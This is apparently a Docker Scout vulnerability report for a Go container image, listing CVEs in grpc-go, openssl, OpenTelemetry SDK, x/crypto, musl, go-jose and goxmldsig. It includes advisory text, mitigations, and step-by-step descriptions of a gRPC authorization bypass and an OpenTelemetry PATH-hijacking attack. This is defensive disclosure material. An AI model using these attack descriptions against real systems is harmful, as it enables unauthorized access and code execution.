<a href="https://scout.docker.com/v/CVE-2026-33186?s=github&n=grpc&ns=google.golang.org&t=golang&vr=%3C1.79.3"><img alt="critical 9.1: CVE--2026--33186" src="https://img.shields.io/badge/CVE--2026--33186-lightgrey?label=critical%209.1&labelColor=8b1924"/></a> <i>Improper Authorization</i>

<table>
<tr><td>Affected range</td><td><code>&lt;1.79.3</code></td></tr>
<tr><td>Fixed version</td><td><code>1.79.3</code></td></tr>
<tr><td>CVSS Score</td><td><code>9.1</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.016%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>3rd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Impact
_What kind of vulnerability is it? Who is impacted?_

It is an **Authorization Bypass** resulting from **Improper Input Validation** of the HTTP/2 `:path` pseudo-header.

The gRPC-Go server was too lenient in its routing logic, accepting requests where the `:path` omitted the mandatory leading slash (e.g., `Service/Method` instead of `/Service/Method`). While the server successfully routed these requests to the correct handler, authorization interceptors (including the official `grpc/authz` package) evaluated the raw, non-canonical path string. Consequently, "deny" rules defined using canonical paths (starting with `/`) failed to match the incoming request, allowing it to bypass the policy if a fallback "allow" rule was present.

**Who is impacted?**
This affects gRPC-Go servers that meet both of the following criteria:
1. They use path-based authorization interceptors, such as the official RBAC implementation in `google.golang.org/grpc/authz` or custom interceptors relying on `info.FullMethod` or `grpc.Method(ctx)`.
2. Their security policy contains specific "deny" rules for canonical paths but allows other requests by default (a fallback "allow" rule).

The vulnerability is exploitable by an attacker who can send raw HTTP/2 frames with malformed `:path` headers directly to the gRPC server.

### Patches
_Has the problem been patched? What versions should users upgrade to?_

Yes, the issue has been patched. The fix ensures that any request with a `:path` that does not start with a leading slash is immediately rejected with a `codes.Unimplemented` error, preventing it from reaching authorization interceptors or handlers with a non-canonical path string.

Users should upgrade to the following versions (or newer):
* **v1.79.3**
* The latest **master** branch.

It is recommended that all users employing path-based authorization (especially `grpc/authz`) upgrade as soon as the patch is available in a tagged release.

### Workarounds
_Is there a way for users to fix or remediate the vulnerability without upgrading?_

While upgrading is the most secure and recommended path, users can mitigate the vulnerability using one of the following methods:

#### 1. Use a Validating Interceptor (Recommended Mitigation)
Add an "outermost" interceptor to your server that validates the path before any other authorization logic runs:

```go
func pathValidationInterceptor(ctx context.Context, req any, info *grpc.UnaryServerInfo, handler grpc.UnaryHandler) (any, error) {
    if info.FullMethod == "" || info.FullMethod[0] != '/' {
        return nil, status.Errorf(codes.Unimplemented, "malformed method name")
    }   
    return handler(ctx, req)
}

// Ensure this is the FIRST interceptor in your chain
s := grpc.NewServer(
    grpc.ChainUnaryInterceptor(pathValidationInterceptor, authzInterceptor),
)
```

#### 2. Infrastructure-Level Normalization
If your gRPC server is behind a reverse proxy or load balancer (such as Envoy, NGINX, or an L7 Cloud Load Balancer), ensure it is configured to enforce strict HTTP/2 compliance for pseudo-headers and reject or normalize requests where the `:path` header does not start with a leading slash.

#### 3. Policy Hardening
Switch to a "default deny" posture in your authorization policies (explicitly listing all allowed paths and denying everything else) to reduce the risk of bypasses via malformed inputs.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 9" src="https://img.shields.io/badge/H-9-e25d68"/> <img alt="medium: 8" src="https://img.shields.io/badge/M-8-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <img alt="unspecified: 2" src="https://img.shields.io/badge/U-2-lightgrey"/><strong>openssl</strong> <code>3.3.3-r0</code> (apk)</summary>

<small><code>pkg:apk/alpine/openssl@3.3.3-r0?os_name=alpine&os_version=3.21</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2025-15467?s=alpine&n=openssl&ns=alpine&t=apk&osn=alpine&osv=3.21&vr=%3C3.3.6-r0"><img alt="high : CVE--2025--15467" src="https://img.shields.io/badge/CVE--2025--15467-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code>&lt;3.3.6-r0</code></td></tr>
<tr><td>Fixed version</td><td><code>3.3.6-r0</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.705%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>72nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>



</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-31790?s=alpine&n=openssl&ns=alpine&t=apk&osn=alpine&osv=3.21&vr=%3C3.3.7-r0"><img alt="high : CVE--2026--31790" src="https://img.shields.io/badge/CVE--2026--31790-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code>&lt;3.3.7-r0</code></td></tr>
<tr><td>Fixed version</td><td><code>3.3.7-r0</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.024%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>6th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>



</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-28390?s=alpine&n=openssl&ns=alpine&t=apk&osn=alpine&osv=3.21&vr=%3C3.3.7-r0"><img alt="high : CVE--2026--28390" src="https://img.shields.io/badge/CVE--2026--28390-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code>&lt;3.3.7-r0</code></td></tr>
<tr><td>Fixed version</td><td><code>3.3.7-r0</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.058%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>18th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>



</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-28389?s=alpine&n=openssl&ns=alpine&t=apk&osn=alpine&osv=3.21&vr=%3C3.3.7-r0"><img alt="high : CVE--2026--28389" src="https://img.shields.io/badge/CVE--2026--28389-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code>&lt;3.3.7-r0</code></td></tr>
<tr><td>Fixed version</td><td><code>3.3.7-r0</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.058%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>18th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>



</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-28388?s=alpine&n=openssl&ns=alpine&t=apk&osn=alpine&osv=3.21&vr=%3C3.3.7-r0"><img alt="high : CVE--2026--28388" src="https://img.shields.io/badge/CVE--2026--28388-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code>&lt;3.3.7-r0</code></td></tr>
<tr><td>Fixed version</td><td><code>3.3.7-r0</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.030%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>9th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>



</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-9230?s=alpine&n=openssl&ns=alpine&t=apk&osn=alpine&osv=3.21&vr=%3C3.3.5-r0"><img alt="high : CVE--2025--9230" src="https://img.shields.io/badge/CVE--2025--9230-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code>&lt;3.3.5-r0</code></td></tr>
<tr><td>Fixed version</td><td><code>3.3.5-r0</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.034%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>10th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>



</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-69421?s=alpine&n=openssl&ns=alpine&t=apk&osn=alpine&osv=3.21&vr=%3C3.3.6-r0"><img alt="high : CVE--2025--69421" src="https://img.shields.io/badge/CVE--2025--69421-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code>&lt;3.3.6-r0</code></td></tr>
<tr><td>Fixed version</td><td><code>3.3.6-r0</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.036%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>11th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>



</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-69420?s=alpine&n=openssl&ns=alpine&t=apk&osn=alpine&osv=3.21&vr=%3C3.3.6-r0"><img alt="high : CVE--2025--69420" src="https://img.shields.io/badge/CVE--2025--69420-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code>&lt;3.3.6-r0</code></td></tr>
<tr><td>Fixed version</td><td><code>3.3.6-r0</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.303%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>54th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>



</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-69419?s=alpine&n=openssl&ns=alpine&t=apk&osn=alpine&osv=3.21&vr=%3C3.3.6-r0"><img alt="high : CVE--2025--69419" src="https://img.shields.io/badge/CVE--2025--69419-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code>&lt;3.3.6-r0</code></td></tr>
<tr><td>Fixed version</td><td><code>3.3.6-r0</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.063%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>20th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>



</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-9231?s=alpine&n=openssl&ns=alpine&t=apk&osn=alpine&osv=3.21&vr=%3C3.3.5-r0"><img alt="medium : CVE--2025--9231" src="https://img.shields.io/badge/CVE--2025--9231-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code>&lt;3.3.5-r0</code></td></tr>
<tr><td>Fixed version</td><td><code>3.3.5-r0</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.022%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>6th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>



</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-9232?s=alpine&n=openssl&ns=alpine&t=apk&osn=alpine&osv=3.21&vr=%3C3.3.5-r0"><img alt="medium : CVE--2025--9232" src="https://img.shields.io/badge/CVE--2025--9232-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code>&lt;3.3.5-r0</code></td></tr>
<tr><td>Fixed version</td><td><code>3.3.5-r0</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.036%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>11th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>



</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-66199?s=alpine&n=openssl&ns=alpine&t=apk&osn=alpine&osv=3.21&vr=%3C3.3.6-r0"><img alt="medium : CVE--2025--66199" src="https://img.shields.io/badge/CVE--2025--66199-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code>&lt;3.3.6-r0</code></td></tr>
<tr><td>Fixed version</td><td><code>3.3.6-r0</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.067%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>21st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>



</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-15468?s=alpine&n=openssl&ns=alpine&t=apk&osn=alpine&osv=3.21&vr=%3C3.3.6-r0"><img alt="medium : CVE--2025--15468" src="https://img.shields.io/badge/CVE--2025--15468-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code>&lt;3.3.6-r0</code></td></tr>
<tr><td>Fixed version</td><td><code>3.3.6-r0</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.022%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>6th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>



</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-22795?s=alpine&n=openssl&ns=alpine&t=apk&osn=alpine&osv=3.21&vr=%3C3.3.6-r0"><img alt="medium : CVE--2026--22795" src="https://img.shields.io/badge/CVE--2026--22795-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code>&lt;3.3.6-r0</code></td></tr>
<tr><td>Fixed version</td><td><code>3.3.6-r0</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.021%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>6th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>



</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-22796?s=alpine&n=openssl&ns=alpine&t=apk&osn=alpine&osv=3.21&vr=%3C3.3.6-r0"><img alt="medium : CVE--2026--22796" src="https://img.shields.io/badge/CVE--2026--22796-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code>&lt;3.3.6-r0</code></td></tr>
<tr><td>Fixed version</td><td><code>3.3.6-r0</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.117%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>30th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>



</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-68160?s=alpine&n=openssl&ns=alpine&t=apk&osn=alpine&osv=3.21&vr=%3C3.3.6-r0"><img alt="medium : CVE--2025--68160" src="https://img.shields.io/badge/CVE--2025--68160-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code>&lt;3.3.6-r0</code></td></tr>
<tr><td>Fixed version</td><td><code>3.3.6-r0</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.027%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>8th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>



</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-69418?s=alpine&n=openssl&ns=alpine&t=apk&osn=alpine&osv=3.21&vr=%3C3.3.6-r0"><img alt="medium : CVE--2025--69418" src="https://img.shields.io/badge/CVE--2025--69418-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code>&lt;3.3.6-r0</code></td></tr>
<tr><td>Fixed version</td><td><code>3.3.6-r0</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.008%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>1st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>



</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-31789?s=alpine&n=openssl&ns=alpine&t=apk&osn=alpine&osv=3.21&vr=%3C3.3.7-r0"><img alt="unspecified : CVE--2026--31789" src="https://img.shields.io/badge/CVE--2026--31789-lightgrey?label=unspecified%20&labelColor=lightgrey"/></a> 

<table>
<tr><td>Affected range</td><td><code>&lt;3.3.7-r0</code></td></tr>
<tr><td>Fixed version</td><td><code>3.3.7-r0</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.012%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>2nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>



</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-28387?s=alpine&n=openssl&ns=alpine&t=apk&osn=alpine&osv=3.21&vr=%3C3.3.7-r0"><img alt="unspecified : CVE--2026--28387" src="https://img.shields.io/badge/CVE--2026--28387-lightgrey?label=unspecified%20&labelColor=lightgrey"/></a> 

<table>
<tr><td>Affected range</td><td><code>&lt;3.3.7-r0</code></td></tr>
<tr><td>Fixed version</td><td><code>3.3.7-r0</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.021%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>6th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>



</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 2" src="https://img.shields.io/badge/H-2-e25d68"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>go.opentelemetry.io/otel/sdk</strong> <code>1.36.0</code> (golang)</summary>

<small><code>pkg:golang/go.opentelemetry.io/otel/sdk@1.36.0</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2026-39883?s=github&n=sdk&ns=go.opentelemetry.io%2Fotel&t=golang&vr=%3E%3D1.15.0%2C%3C%3D1.42.0"><img alt="high 7.3: CVE--2026--39883" src="https://img.shields.io/badge/CVE--2026--39883-lightgrey?label=high%207.3&labelColor=e25d68"/></a> <i>Untrusted Search Path</i>

<table>
<tr><td>Affected range</td><td><code>>=1.15.0<br/><=1.42.0</code></td></tr>
<tr><td>Fixed version</td><td><code>1.43.0</code></td></tr>
<tr><td>CVSS Score</td><td><code>7.3</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:L/AC:H/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.006%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>0th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

## Summary

The fix for GHSA-9h8m-3fm2-qjrq (CVE-2026-24051) changed the Darwin `ioreg` command to use an absolute path but left the BSD `kenv` command using a bare name, allowing the same PATH hijacking attack on BSD and Solaris platforms.

## Root Cause

`sdk/resource/host_id.go` line 42:

    if result, err := r.execCommand("kenv", "-q", "smbios.system.uuid"); err == nil {

Compare with the fixed Darwin path at line 58:

    result, err := r.execCommand("/usr/sbin/ioreg", "-rd1", "-c", "IOPlatformExpertDevice")

The `execCommand` helper at `sdk/resource/host_id_exec.go` uses `exec.Command(name, arg...)` which searches `$PATH` when the command name contains no path separator.

Affected platforms (per build tag in `host_id_bsd.go:4`): DragonFly BSD, FreeBSD, NetBSD, OpenBSD, Solaris.

The `kenv` path is reached when `/etc/hostid` does not exist (line 38-40), which is common on FreeBSD systems.

## Attack

1. Attacker has local access to a system running a Go application that imports `go.opentelemetry.io/otel/sdk`
2. Attacker places a malicious `kenv` binary earlier in `$PATH`
3. Application initializes OpenTelemetry resource detection at startup
4. `hostIDReaderBSD.read()` calls `exec.Command("kenv", ...)` which resolves to the malicious binary
5. Arbitrary code executes in the context of the application

Same attack vector and impact as CVE-2026-24051.

## Suggested Fix

Use the absolute path:

    if result, err := r.execCommand("/bin/kenv", "-q", "smbios.system.uuid"); err == nil {

On FreeBSD, `kenv` is located at `/bin/kenv`.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-24051?s=github&n=sdk&ns=go.opentelemetry.io%2Fotel&t=golang&vr=%3E%3D1.21.0%2C%3C1.40.0"><img alt="high 7.0: CVE--2026--24051" src="https://img.shields.io/badge/CVE--2026--24051-lightgrey?label=high%207.0&labelColor=e25d68"/></a> <i>Untrusted Search Path</i>

<table>
<tr><td>Affected range</td><td><code>>=1.21.0<br/><1.40.0</code></td></tr>
<tr><td>Fixed version</td><td><code>1.40.0</code></td></tr>
<tr><td>CVSS Score</td><td><code>7</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.008%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>1st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Impact
The OpenTelemetry Go SDK in version `v1.20.0`-`1.39.0` is vulnerable to Path Hijacking (Untrusted Search Paths) on macOS/Darwin systems. The resource detection code in `sdk/resource/host_id.go` executes the `ioreg` system command using a search path. An attacker with the ability to locally modify the PATH environment variable can achieve Arbitrary Code Execution (ACE) within the context of the application.

### Patches
This has been patched in [d45961b](https://github.com/open-telemetry/opentelemetry-go/commit/d45961bcda453fcbdb6469c22d6e88a1f9970a53), which was released with `v1.40.0`.

### References
- [CWE-426: Untrusted Search Path](https://cwe.mitre.org/data/definitions/426.html)

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 1" src="https://img.shields.io/badge/H-1-e25d68"/> <img alt="medium: 2" src="https://img.shields.io/badge/M-2-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>golang.org/x/crypto</strong> <code>0.38.0</code> (golang)</summary>

<small><code>pkg:golang/golang.org/x/crypto@0.38.0</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2025-47913?s=golang&n=crypto&ns=golang.org%2Fx&t=golang&vr=%3C0.43.0"><img alt="high : CVE--2025--47913" src="https://img.shields.io/badge/CVE--2025--47913-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code>&lt;0.43.0</code></td></tr>
<tr><td>Fixed version</td><td><code>0.43.0</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.013%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>2nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

SSH clients receiving SSH_AGENT_SUCCESS when expecting a typed response will panic and cause early termination of the client process.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-58181?s=github&n=crypto&ns=golang.org%2Fx&t=golang&vr=%3C0.45.0"><img alt="medium 5.3: CVE--2025--58181" src="https://img.shields.io/badge/CVE--2025--58181-lightgrey?label=medium%205.3&labelColor=fbb552"/></a> <i>Allocation of Resources Without Limits or Throttling</i>

<table>
<tr><td>Affected range</td><td><code>&lt;0.45.0</code></td></tr>
<tr><td>Fixed version</td><td><code>0.45.0</code></td></tr>
<tr><td>CVSS Score</td><td><code>5.3</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.087%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>25th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

SSH servers parsing GSSAPI authentication requests do not validate the number of mechanisms specified in the request, allowing an attacker to cause unbounded memory consumption.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-47914?s=github&n=crypto&ns=golang.org%2Fx&t=golang&vr=%3C0.45.0"><img alt="medium 5.3: CVE--2025--47914" src="https://img.shields.io/badge/CVE--2025--47914-lightgrey?label=medium%205.3&labelColor=fbb552"/></a> <i>Out-of-bounds Read</i>

<table>
<tr><td>Affected range</td><td><code>&lt;0.45.0</code></td></tr>
<tr><td>Fixed version</td><td><code>0.45.0</code></td></tr>
<tr><td>CVSS Score</td><td><code>5.3</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.021%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>6th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

SSH Agent servers do not validate the size of messages when processing new identity requests, which may cause the program to panic if the message is malformed due to an out of bounds read.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 1" src="https://img.shields.io/badge/H-1-e25d68"/> <img alt="medium: 1" src="https://img.shields.io/badge/M-1-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>musl</strong> <code>1.2.5-r9</code> (apk)</summary>

<small><code>pkg:apk/alpine/musl@1.2.5-r9?os_name=alpine&os_version=3.21</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2026-40200?s=alpine&n=musl&ns=alpine&t=apk&osn=alpine&osv=3.21&vr=%3C1.2.5-r11"><img alt="high : CVE--2026--40200" src="https://img.shields.io/badge/CVE--2026--40200-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code>&lt;1.2.5-r11</code></td></tr>
<tr><td>Fixed version</td><td><code>1.2.5-r11</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.014%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>2nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>



</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-6042?s=alpine&n=musl&ns=alpine&t=apk&osn=alpine&osv=3.21&vr=%3C1.2.5-r10"><img alt="medium : CVE--2026--6042" src="https://img.shields.io/badge/CVE--2026--6042-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code>&lt;1.2.5-r10</code></td></tr>
<tr><td>Fixed version</td><td><code>1.2.5-r10</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.013%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>2nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>



</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 1" src="https://img.shields.io/badge/H-1-e25d68"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>github.com/go-jose/go-jose/v4</strong> <code>4.1.0</code> (golang)</summary>

<small><code>pkg:golang/github.com/go-jose/go-jose/v4@4.1.0</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2026-34986?s=github&n=v4&ns=github.com%2Fgo-jose%2Fgo-jose&t=golang&vr=%3C4.1.4"><img alt="high 7.5: CVE--2026--34986" src="https://img.shields.io/badge/CVE--2026--34986-lightgrey?label=high%207.5&labelColor=e25d68"/></a> <i>Uncaught Exception</i>

<table>
<tr><td>Affected range</td><td><code>&lt;4.1.4</code></td></tr>
<tr><td>Fixed version</td><td><code>4.1.4</code></td></tr>
<tr><td>CVSS Score</td><td><code>7.5</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.019%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>5th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Impact

Decrypting a JSON Web Encryption (JWE) object will panic if the `alg` field indicates a key wrapping algorithm ([one ending in `KW`](https://pkg.go.dev/github.com/go-jose/go-jose/v4#pkg-constants), with the exception of `A128GCMKW`, `A192GCMKW`, and `A256GCMKW`) and the `encrypted_key` field is empty. The panic happens when `cipher.KeyUnwrap()` in `key_wrap.go` attempts to allocate a slice with a zero or negative length based on the length of the `encrypted_key`.

This code path is reachable from `ParseEncrypted()` / `ParseEncryptedJSON()` / `ParseEncryptedCompact()` followed by `Decrypt()` on the resulting object. Note that the parse functions take a list of accepted key algorithms. If the accepted key algorithms do not include any key wrapping algorithms, parsing will fail and the application will be unaffected.

This panic is also reachable by calling `cipher.KeyUnwrap()` directly with any `ciphertext` parameter less than 16 bytes long, but calling this function directly is less common.

Panics can lead to denial of service.

### Fixed In

4.1.4 and v3.0.5

### Workarounds

If the list of `keyAlgorithms` passed to `ParseEncrypted()` / `ParseEncryptedJSON()` / `ParseEncryptedCompact()` does not include key wrapping algorithms (those ending in `KW`), your application is unaffected.

If your application uses key wrapping, you can prevalidate to the JWE objects to ensure the `encrypted_key` field is nonempty. If your application accepts JWE Compact Serialization, apply that validation to the corresponding field of that serialization (the data between the first and second `.`).

### Thanks

Thanks to Datadog's Security team for finding this issue.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 1" src="https://img.shields.io/badge/H-1-e25d68"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>github.com/russellhaering/goxmldsig</strong> <code>1.5.0</code> (golang)</summary>

<small><code>pkg:golang/github.com/russellhaering/goxmldsig@1.5.0</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2026-33487?s=github&n=goxmldsig&ns=github.com%2Frussellhaering&t=golang&vr=%3C%3D1.5.0"><img alt="high 7.5: CVE--2026--33487" src="https://img.shields.io/badge/CVE--2026--33487-lightgrey?label=high%207.5&labelColor=e25d68"/></a> <i>Improper Verification of Cryptographic Signature</i>

<table>
<tr><td>Affected range</td><td><code>&lt;=1.5.0</code></td></tr>
<tr><td>Fixed version</td><td><code>1.6.0</code></td></tr>
<tr><td>CVSS Score</td><td><code>7.5</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.016%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>4th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Details

